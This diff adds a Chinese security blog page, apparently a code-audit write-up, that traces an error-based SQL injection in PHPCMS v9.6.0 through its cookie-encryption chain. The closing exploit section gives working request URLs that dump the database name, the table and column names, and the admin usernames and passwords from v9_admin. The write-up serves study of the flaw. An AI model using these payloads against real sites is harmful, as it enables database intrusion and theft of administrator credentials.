@@ -1,0 +1,324 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PHPCMSv9.6.0-wap模块SQL注入 - xiaofeiji&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xiaofeiji,"> 
+    <meta name="description" content="过程第一步：利用wap模块下的index.php，构造数据包发送get请求，得到一个cookie值：
+发送：
+1/index.php?m=wap&amp;amp;c=index&amp;amp;siteid=1
+
+,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="xiaofeiji&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+   </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <span id="config-title" style="display:none">xiaofeiji&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">PHPCMSv9.6.0-wap模块SQL注入</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">PHPCMSv9.6.0-wap模块SQL注入</h1>
+        <div class="stuff">
+            <span>一月 23, 2022</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%9D%E4%BD%93%E9%AA%8C/" rel="tag">代码审计初体验</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>第一步：利用wap模块下的index.php，构造数据包发送get请求，得到一个cookie值：</p>
+<p>发送：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?m=wap&amp;c=index&amp;siteid=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="clipboard.png" alt="img"></p>
+<p>第二步：在attachment下的attachment.php里的swfupload_json()函数中，构造payload，post传递第一步得到的cookie的值，得到一个以json形式存储的加密数据的cookie值：</p>
+<p>发送：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26</span><br><span class="line"></span><br><span class="line">userid_flash=7dc9eozxw0p58awdGBJQPHJ0QG1wzjEDi8UJjMgh</span><br></pre></td></tr></table></figure>
+
+<p><img src="clipboard-1642910687148.png" alt="img"></p>
+<p>得到一个cookie值。</p>
+<p>第三步：将第二步得到的json加密数据作为a_k参数的值进行get传参，这里利用到的是content下的down.php：</p>
+<p>发送：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?m=content&amp;c=down&amp;a_k=5ba0VHvGmPWaWddcaed1Rfpp_M6KVCoZ5KcEEkx9dUktRfVsaZ6J4odXZVrA2C8CZ1Yl88r0t-_Tr0HNr-U1r5cDHMtWKbWjnjuQx1ClGe4fXe2F6Ghv0xKyYT91Qt64wRpYy3EwL-iaBl20j0POmXQpCKdlr_qjSbEQTTbmsOWHIE42eCqcqjM</span><br></pre></td></tr></table></figure>
+
+<p><img src="clipboard-1642910842012.png" alt="img"></p>
+<p>最终通过报错语句的回显，爆出数据库的user。</p>
+<p>以上是整个注入的利用过程，下面来逐步进行分析该注入点的利用方法。我们从第三步开始倒推：</p>
+<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><p>在第三步中，我们通过SQL语句的报错信息得到用户信息，找到content模块下的down.php文件进行分析：</p>
+<p>寻找a_k参数出现的位置，根据变量的搜索找到函数init()：</p>
+<p>分析一下该函数的使用过程，结合xdebug进行变量分析：</p>
+<img src="clipboard-1642910874221.png" alt="img" style="zoom:80%;" />
+
+
+
+<p>可以看到经过sys_auth()函数处理后，将a_k参数解密的内容解密成字符串形式：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;aid&quot;:1,&quot;src&quot;:&quot;&amp;id=%27 and updatexml(1,concat(1,(user())),1)#&amp;m=1&amp;f=haha&amp;modelid=2&amp;catid=7&amp;&quot;,&quot;filename&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>跟进sys_auth()函数查看过程：</p>
+<p><img src="clipboard-1642910927379.png" alt="img"></p>
+<p>能看到在该参数中存在报错注入的语句，$id的值为 ‘ and updatexml(1,concat(1，(user())),1)#</p>
+<p>这里能从$src中将id分离出来是因为parse_str()函数会将字符串解析成多个变量。</p>
+<p>如下图代码所示，age也变为一个单独的变量名被使用。</p>
+<p><img src="clipboard-1642910944265.png" alt="img"></p>
+<p>因此在源代码中传进去的$src经过parse_str()函数后，也会将id看成一个单独的变量，并且它的值等于&amp;id=%27 and updatexml(1,concat(1,(user())),1)#。</p>
+<p>查看发现$id在26行代码中被使用，使用了get_one()函数处理，跟进：</p>
+<p>先调用的是model.class.php中的get_one函数传输参数$data=”*”，</p>
+<img src="clipboard-1642910958413.png" alt="img" style="zoom:80%;" />
+
+
+
+<p>紧接着使用sqls函数处理变量$where，跟进函数：传输变量$where的值为<code>id</code>= ‘’ and updatexml(1,concat(1，(user())),1)#’（键值对的形式存储）</p>
+<img src="clipboard-1642911073434.png" alt="img" style="zoom:80%;" />
+
+
+
+<p>紧接着调用db类中的get_one()函数，</p>
+<p><img src="../../../../../%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F2.0/%E6%9C%89%E9%81%93%E4%BA%91/weixinobU7VjqPdNJgN1EdVtidndQeo_KM/6adaf7d7fbef4ea496a3204f25c0472a/clipboard.png" alt="img"></p>
+<p>db_mysqli.class.php下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = &quot;*&quot;，$where=&quot;`id`=&#x27;&#x27;and updatexml(1,concat(1，(user())),1)#&#x27;&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="clipboard-1642911122317.png" alt="img" style="zoom:80%;" />
+
+
+
+<p>经过该函数的处理：</p>
+<p>$where前拼接WHERE </p>
+<p>$sql就变为：</p>
+<p><img src="clipboard-1642911131033.png" alt="img"></p>
+<p>然后经过execute()函数，跟进：</p>
+<p><img src="clipboard-1642911137402.png" alt="img"></p>
+<p>如果SQL语句错误，会通过mysqli_error()函数返回错误描述，因此，我们找到了注入的触发点。</p>
+<p>总结这一步骤：通过sys_auth()函数对a_k的值进行解密，然后通过$id找到get_one()函数，然后找到了SQL语句的代码，并找到语句的触发点为execute()方法。</p>
+<p>那么a_k的加密字符串是从哪里得来的呢，从这里追溯到第二步。</p>
+<h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>找到attachment下的attachments.php中的swfupload_json()函数：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26</span><br><span class="line">尝试将src的值进行url解码：</span><br><span class="line">&amp;id=%*27 and updatexml(1,concat(1,(user())),1)#&amp;m=1&amp;f=haha&amp;modelid=2&amp;catid=7&amp;</span><br></pre></td></tr></table></figure>
+
+<p><img src="clipboard-1642911189442.png" alt="img"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该函数接收get变量传入的$aid，get传入变量src后会将参数交给safe_replace()处理，$filename我们没有进行传值，略过这一行代码。然后将get得到的$aid和$src的值使用json_encode()函数处理成json类型编码数据存储形式。下面一个if语句需要判断$att_arr_exist_tmp的值，追溯$att_arr_exist，该参数取经过param下的get_cookie方法处理att_json的结果。如果经过||分割后的$att_arr_exist的值是一个数组并且$json_str在$att_arr_exist_tmp这个数组里面的话返回true，否则执行else语句，调用set_cookie。</span><br></pre></td></tr></table></figure>
+
+<p>因此这里我主要分析三个点，找到safe_replace()处理的过程，能得到返回的结果；找到get_cookie处理的过程和返回的结果，以此作为语句执行的依据。第三点，如果执行的是else语句，跟进set_cookie()查看处理过程。</p>
+<h5 id="第一点：safe-replace-处理"><a href="#第一点：safe-replace-处理" class="headerlink" title="第一点：safe_replace()处理"></a>第一点：safe_replace()处理</h5><p>首先解决第一个问题，跟进safe_replace()函数：</p>
+<p><img src="clipboard-1642911222478.png" alt="img"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以看到该函数会将%*27中的*号替换为空，因此构造成了%27，也就是单引号，如果直接写成%27，那么经过该函数处理，%27就会被过滤掉。这就是为什么要写成%*27的原因。</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="第二点：跟进get-cookie方法，查看返回结果。"><a href="#第二点：跟进get-cookie方法，查看返回结果。" class="headerlink" title="第二点：跟进get_cookie方法，查看返回结果。"></a>第二点：跟进get_cookie方法，查看返回结果。</h5><p>param.class.php：</p>
+<p><img src="clipboard-1642911263962.png" alt="img"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为$var变量不是数组，因此跳过if语句直接执行return，返回$value也就是$default的值，即返回空。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>回到一开始的语句：</p>
+<p>$att_arr_exist结果为空，执行else语句。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$json_str=&quot;&#123;&quot;aid&quot;:1,&quot;src&quot;:&quot;&amp;id=%*27 and updatexml(1,concat(1,(user())),1)#&amp;m=1&amp;f=haha&amp;modelid=2&amp;catid=7&amp;&quot;,filename&quot;:&quot;&quot;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="clipboard-1642911293350.png" alt="img" style="zoom:80%;" />
+
+
+
+<h5 id="第三点：跟进set-cookie-函数："><a href="#第三点：跟进set-cookie-函数：" class="headerlink" title="第三点：跟进set_cookie()函数："></a>第三点：跟进set_cookie()函数：</h5><p><img src="clipboard-1642911311963.png" alt="img"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var为变量名att_json，$value为变量的值&quot;&#123;&quot;aid&quot;:1,&quot;src&quot;:&quot;&amp;id=%*27 and updatexml(1,concat(1,(user())),1)#&amp;m=1&amp;f=haha&amp;modelid=2&amp;catid=7&amp;&quot;,filename&quot;:&quot;&quot;&#125;&quot;，</span><br></pre></td></tr></table></figure>
+
+
+
+<p>$var加上了经过load_config函数处理后的前缀，得到的值为QskZK_att_json：</p>
+<p><img src="clipboard-1642911334769.png" alt="img"></p>
+<p>$value经过sys_auth()函数的加密处理，返回加密后的结果，也就是第二步中响应得到的cookie值。</p>
+<img src="clipboard-1642911340456.png" alt="img" style="zoom:80%;" />
+
+
+
+<p>至此，我们也解决了第三步遗留下来的为什么参数值是加密的问题。</p>
+<p>但是这里，我们注意到，第二步在进行数据包构造的时候，post传递了一个值：</p>
+<p>userid_flash=7dc9eozxw0p58awdGBJQPHJ0QG1wzjEDi8UJjMgh</p>
+<p>为什么要进行userid的传参呢？这是因为在执行attachments.php是，代码中存在对userid的验证，往上找到__construct()函数：</p>
+<p><img src="clipboard-1642911357802.png" alt="img"></p>
+<p>这里可以看到对userid的值进行了判断，如果userid不存在的话，会跳出需要登录的提示，无法继续执行我们第二步构造所期望的代码。</p>
+<p>往上找到userid的定义：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;userid = $_SESSION[&#x27;userid&#x27;] ? $_SESSION[&#x27;userid&#x27;] : (param::*get_cookie*(&#x27;_userid&#x27;) ? param::*get_cookie*(&#x27;_userid&#x27;) : sys_auth($_POST[&#x27;userid_flash&#x27;],&#x27;DECODE&#x27;));</span><br><span class="line"></span><br><span class="line">因为我们是没有$_SESSION[&#x27;userid&#x27;]的值的，因此执行最终的语句为：sys_auth($_POST[&#x27;userid_flash&#x27;],&#x27;DECODE&#x27;))。</span><br></pre></td></tr></table></figure>
+
+<p>post提交一个参数userid_flash，并且这个值会经过sys_auth()函数进行解密。</p>
+<p>因此如果我们提交一个post的值是经过sys_auth()函数加密的，就可以绕过对userid的验证。</p>
+<h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>这里我们找到了wap模块下的index.php：</p>
+<p><img src="clipboard-1642911394912.png" alt="img"></p>
+<p>这里我们传入的siteid为1，经过三目运算符的处理，执行到第九行的代码，跟进set_cookie()的处理：</p>
+<p><img src="clipboard-1642911404264.png" alt="img"></p>
+<p>执行else语句，会将变量siteid的值1，经过sys_auth()函数加密，将加密后的值作为cookie返回给客户端。</p>
+<p>因此我们也成功找到了第二步中需要的加密点。</p>
+<h4 id="整体梳理"><a href="#整体梳理" class="headerlink" title="整体梳理"></a>整体梳理</h4><p>这里，我们再从第一步正向整理一下分析的过程：</p>
+<p>第一步中，我们调用了wap模块下的__construct()函数处理siteid=1时会使用sys_auth()函数加密并且设置cookie的点，在第二步中，我们使用userid的值绕过对userid的判断，使用attachments()中的swfupload_json()函数，构造报错注入语句，使用set_cookie()和sys_auth()函数对构造的值进行加密处理，这一步中返回的att_json的值刚好可以作为第三步中$a_k的值，$a_k的值会经过sys_auth()函数进行解密，并触发get_one()中调用的execute()函数，执行了第二步中构造的SQL注入报错语句。</p>
+<p>代码的分析思路主要是通过get_cookie()、set_cookie()以及sys_auth()这几个关键的点联系起来的。</p>
+<h3 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h3><h4 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28database%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(&amp;id=%*27 and updatexml(1,concat(1,(database())),1)#&amp;m=1&amp;f=haha&amp;modelid=2&amp;catid=7&amp;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/index.php?m=content&amp;c=down&amp;a_k=（接上面生成的QskZK_att_json的值）</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="爆破表名"><a href="#爆破表名" class="headerlink" title="爆破表名"></a>爆破表名</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%280x7e%2C%28select%20table_name%20from%20information_schema.tables%20where%20table_schema=database%28%29%20limit%200%2C1%29%29%2C3%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),3)#&amp;m=1&amp;f=haha&amp;modelid=2&amp;catid=7&amp;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/index.php?m=content&amp;c=down&amp;a_k=（接上面生成的QskZK_att_json的值）</span><br><span class="line"></span><br><span class="line">通过limit一个个爆破。</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="爆破字段名"><a href="#爆破字段名" class="headerlink" title="爆破字段名"></a>爆破字段名</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%280x7e%2C%28select%20group_concat%28column_name%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20table_name=%*27v9_admin%*27%29%29%2C3%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">改成对应的表名</span><br><span class="line">(%*27 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=%*27v9_admin%*27)),3)#&amp;m=1&amp;f=haha&amp;modelid=2&amp;catid=7&amp;)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">/index.php?m=content&amp;c=down&amp;a_k=（接上面生成的QskZK_att_json的值）</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="爆破字段内容"><a href="#爆破字段内容" class="headerlink" title="爆破字段内容"></a>爆破字段内容</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%280x7e%2C%28select%20group_concat%28username%2Cpassword%29%20from%20v9_admin%29%29%2C3%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(&amp;id=%*27 and updatexml(1,concat(0x7e,(select group_concat(username,password) from v9_admin)),3)#&amp;m=1&amp;f=haha&amp;modelid=2&amp;catid=7&amp;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/index.php?m=content&amp;c=down&amp;a_k=（接上面生成的QskZK_att_json的值）</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable=''
+        data-ae=''
+        data-ci=''
+        data-cs=''
+        data-r='xiaofeiji-77.github.io'
+        data-o='xiaofeiji-77'
+        data-a='xiaofeiji-77'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5"><span class="toc-number">2.1.</span> <span class="toc-text">第三步</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5"><span class="toc-number">2.2.</span> <span class="toc-text">第二步</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%82%B9%EF%BC%9Asafe-replace-%E5%A4%84%E7%90%86"><span class="toc-number">2.2.1.</span> <span class="toc-text">第一点：safe_replace()处理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%82%B9%EF%BC%9A%E8%B7%9F%E8%BF%9Bget-cookie%E6%96%B9%E6%B3%95%EF%BC%8C%E6%9F%A5%E7%9C%8B%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E3%80%82"><span class="toc-number">2.2.2.</span> <span class="toc-text">第二点：跟进get_cookie方法，查看返回结果。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%82%B9%EF%BC%9A%E8%B7%9F%E8%BF%9Bset-cookie-%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">2.2.3.</span> <span class="toc-text">第三点：跟进set_cookie()函数：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5"><span class="toc-number">2.3.</span> <span class="toc-text">第一步</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B4%E4%BD%93%E6%A2%B3%E7%90%86"><span class="toc-number">2.4.</span> <span class="toc-text">整体梳理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0exp"><span class="toc-number">3.</span> <span class="toc-text">构造exp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">3.1.</span> <span class="toc-text">获取数据库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E8%A1%A8%E5%90%8D"><span class="toc-number">3.2.</span> <span class="toc-text">爆破表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">3.3.</span> <span class="toc-text">爆破字段名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9"><span class="toc-number">3.4.</span> <span class="toc-text">爆破字段内容</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+   
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script>
+</html>
